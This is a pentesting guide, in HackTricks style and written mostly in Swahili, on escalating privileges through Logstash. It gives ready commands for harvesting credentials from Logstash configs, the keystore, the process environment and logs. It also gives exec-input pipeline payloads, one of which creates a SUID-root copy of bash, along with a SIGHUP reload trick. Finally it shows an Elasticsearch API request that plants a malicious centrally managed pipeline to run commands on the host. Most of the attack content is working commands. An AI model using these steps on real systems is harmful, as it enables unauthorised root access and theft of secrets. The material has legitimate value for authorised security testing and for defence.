# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash inatumiwa **kukusanya, kubadilisha, na kusambaza logs** kupitia mfumo unaoitwa **pipelines**. Hizi **pipelines** zinafanywa na hatua za **input**, **filter**, na **output**. Jambo la kuvutia linatokea wakati Logstash inafanya kazi kwenye mashine iliyotekwa.

### Pipeline Configuration

Pipelines zimewekwa katika faili **/etc/logstash/pipelines.yml**, ambayo inaorodhesha maeneo ya usanidi wa pipeline:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Hili faili linafunua wapi mafaili ya **.conf**, yanayobeba usanidi wa **pipelines**, zipo. Unapotumia **Elasticsearch output module**, kawaida **pipelines** zinajumuisha **Elasticsearch credentials**, ambazo mara nyingi zina ruhusa nyingi kwa sababu Logstash inahitaji kuandika data kwa Elasticsearch. Wildcards katika njia za usanidi zinafanya Logstash iendeshe pipelines zote zinazolingana katika saraka iliyowekwa.

Ikiwa Logstash inaanzishwa kwa `-f <directory>` badala ya `pipelines.yml`, **mafayela yote ndani ya directory hiyo yanachanganywa kwa mpangilio wa maneno (lexicographical order) na kutafsiriwa kama config moja**. Hii ina maana mbili za kushambulia:

- Faili iliyowekwa kama `000-input.conf` au `zzz-output.conf` inaweza kubadilisha jinsi pipeline ya mwisho inavyokusanywa
- Faili isiyo sawa inaweza kuzuia pipeline yote isipakuliwe, hivyo thibitisha payloads kwa uangalifu kabla ya kutegemea auto-reload

### Uorodheshaji wa Haraka kwenye Host Iliyovamiwa

Kwenye mashine ambapo Logstash imewekwa, chunguza kwa haraka:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Pia hakikisha API ya ufuatiliaji wa ndani inapatikana. Kwa chaguo-msingi inasikiza kwenye **127.0.0.1:9600**, ambayo kwa kawaida inatosha baada ya kufika kwenye mwenyeji:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
This usually gives you pipeline IDs, runtime details, and confirmation that your modified pipeline has been loaded.

Credentials recovered from Logstash commonly unlock **Elasticsearch**, so check [ukurasa huu mwingine kuhusu Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation via Writable Pipelines

To attempt privilege escalation, first identify the user under which the Logstash service is running, typically the **logstash** user. Ensure you meet **one** of these criteria:

- Kuwa na **write access** kwa faili ya pipeline **.conf** **au**
- Faili ya **/etc/logstash/pipelines.yml** inatumia wildcard, na unaweza kuandika kwenye folda lengwa

Additionally, **one** of these conditions must be fulfilled:

- Uwezo wa kuanzisha tena huduma ya Logstash **au**
- Faili **/etc/logstash/logstash.yml** ina **config.reload.automatic: true** imewekwa

Given a wildcard in the configuration, creating a file that matches this wildcard allows for command execution. For instance:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Hapa, **interval** inabainisha mara za utekelezaji kwa sekunde. Katika mfano uliotolewa, amri ya **whoami** inaendeshwa kila sekunde 120, na matokeo yake yanaelekezwa kwa **/tmp/output.log**.

Kwa **config.reload.automatic: true** katika **/etc/logstash/logstash.yml**, Logstash itatambua na kutekeleza kwa otomatiki pipeline configurations mpya au zilizobadilishwa bila hitaji la kuanzisha upya. Ikiwa hakuna wildcard, bado mabadiliko yanaweza kufanywa kwenye configurations zilizopo, lakini inashauriwa kuwa makini ili kuepuka usumbufu.

### Pipeline Payloads Zinazotegemewa Zaidi

Input plugin ya `exec` bado inafanya kazi katika releases za sasa na inahitaji ama `interval` au `schedule`. Inaendesha kwa **forking** JVM ya Logstash, hivyo ikiwa memory iko finyu payload yako inaweza kushindwa kwa `ENOMEM` badala ya kuendeshwa kimya.

Privilege-escalation payload ya vitendo kwa kawaida huwa ile inayowacha artifact ya kudumu:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Ikiwa huna haki za kuanzisha upya lakini unaweza kumtuma ishara kwa mchakato, Logstash pia inaunga mkono upakiaji upya uliosababishwa na **SIGHUP** kwenye mifumo inayofanana na Unix:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Fahamu kwamba si kila plugin inayoendana na reload. Kwa mfano, input ya **stdin** inazuia reload ya moja kwa moja, kwa hivyo usidhani `config.reload.automatic` itachukua mabadiliko yako kila wakati.

### Kuiba Siri kutoka Logstash

Kabla ya kuzingatia tu utekelezaji wa msimbo, vuna data ambazo Logstash tayari ina ufikiaji wa:

- Kredenshali za plaintext mara nyingi zimehardcoded ndani ya `elasticsearch {}` outputs, `http_poller`, JDBC inputs, au mipangilio inayohusiana na cloud
- Mipangilio salama inaweza kuwa katika **`/etc/logstash/logstash.keystore`** au kabrasha nyingine ya `path.settings`
- Nenosiri la keystore mara nyingi hutoa kupitia **`LOGSTASH_KEYSTORE_PASS`**, na ufungaji wa package kwa kawaida huchukua kutoka **`/etc/sysconfig/logstash`**
- Upanuzi wa variable za mazingira na `${VAR}` unatatatishwa wakati wa kuanzisha Logstash, kwa hivyo mazingira ya huduma yanastahili kuchunguzwa

Mikaguzi muhimu:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Hii pia inafaa kuangaliwa kwa sababu **CVE-2023-46672** ilionyesha kwamba Logstash inaweza kurekodi taarifa nyeti katika logs chini ya mazingira maalum. Kwenye post-exploitation host, logs za zamani za Logstash na rekodi za `journald` zinaweza kwa hivyo kufichua credentials hata kama config ya sasa inarejelea keystore badala ya kuhifadhi siri inline.

### Matumizi Mabaya ya Centralized Pipeline Management

Katika mazingira mengine, host haitegemei kabisa faili za ndani za `.conf`. Ikiwa **`xpack.management.enabled: true`** imewekwa, Logstash inaweza kuvuta centrally managed pipelines kutoka Elasticsearch/Kibana, na baada ya kuwasha mode hii configs za pipeline za ndani hazitakuwa chanzo cha ukweli tena.

Hii inamaanisha njia tofauti ya kushambulia:

1. Pata Elastic credentials kutoka kwa local Logstash settings, keystore, au logs
2. Thibitisha ikiwa akaunti ina **`manage_logstash_pipelines`** cluster privilege
3. Unda au badilisha centrally managed pipeline ili Logstash host itekeleze payload yako kwenye poll interval yake inayofuata

Elasticsearch API inayotumika kwa kipengele hiki ni:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Hii ni muhimu hasa wakati mafaili ya ndani yamewekwa kuwa ya kusoma-tu, lakini Logstash tayari imejisajili kuvuta pipelines kwa mbali.

## Marejeo

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
